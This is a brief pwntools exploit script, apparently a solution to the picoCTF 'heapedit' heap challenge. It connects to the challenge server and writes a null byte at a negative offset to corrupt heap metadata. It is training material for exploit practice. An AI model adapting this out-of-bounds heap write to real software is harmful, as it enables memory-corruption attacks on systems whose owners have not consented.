#!/usr/bin/env python3

from pwn import *
binary = './heapedit_patched'
elf = (binary)
libc = ELF("./libc.so.6")

p = process(binary)
p = remote("mercury.picoctf.net", 31153)
context.binary = binary 

p.sendlineafter(b"Address: ", b'-5144')
p.sendlineafter(b"Value: ", b'\x00')

p.interactive()
